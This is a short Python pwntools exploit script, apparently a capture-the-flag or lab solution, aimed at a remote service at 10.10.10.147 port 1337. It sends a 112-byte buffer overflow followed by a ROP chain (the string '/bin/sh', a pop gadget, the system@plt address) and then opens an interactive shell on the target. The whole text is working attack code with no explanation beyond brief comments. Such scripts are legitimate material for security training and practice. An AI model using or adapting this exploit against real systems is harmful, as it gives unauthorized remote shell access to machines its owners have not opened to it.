from pwn import *
context(terminal=['tmux','new-window'])
p = remote('10.10.10.147',1337)
context(os="linux",arch="amd64")

st = "A"*112 #overflow the buffer with 112 chars until we get to the RSP register
sh = "/bin/sh\x00"
system = p64(0x401040) #address of system@plt (system())
gadget = p64(0x401206) #0x0000000000401206: pop r13; pop r14; pop r15; ret;
null = p64(0x00)
test_func = p64(0x401152) #calling test function
payload = st + sh + gadget + system + null + null + test_func
p.sendline(payload)
p.interactive()
